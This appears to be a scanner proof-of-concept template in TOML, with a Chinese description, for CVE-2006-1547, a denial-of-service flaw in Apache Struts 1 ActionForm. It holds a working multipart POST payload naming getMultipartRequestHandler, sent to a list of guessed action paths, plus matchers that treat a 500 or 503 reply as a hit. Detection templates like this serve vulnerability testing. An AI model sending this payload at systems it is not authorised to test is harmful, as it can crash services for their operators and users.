[info]
id = "POC-AVE-2006-0003"
name = "Apache Struts 1 ActionForm 拒绝服务漏洞 PoC"
author = "AVE"
severity = "high"
tags = ["dos", "struts"]
description = "Apache Struts 1.2.9 之前版本中 ActionForm 配合 BeanUtils 1.7 时的拒绝服务漏洞。远程攻击者可通过 multipart/form-data 编码的表单，构造引用 public getMultipartRequestHandler 方法的参数名，访问内部元素导致拒绝服务。"
vuln_id = ["CVE-2006-1547", "AVE-2006-0003"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/${actionPath}.do"

headers.Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"

body.type = "raw"
body.content = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"getMultipartRequestHandler\"\r\n\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"

[[poc.requests.matchers]]
type = "status"
status = [500, 503]
expect = true

[[poc.requests.matchers]]
type = "status"
status = [200, 302, 404]
expect = false

[poc.attack]
type = "pitchfork"

[poc.payloads]
actionPath = ["login", "index", "upload", "file", "attachment", "register", "submit"]
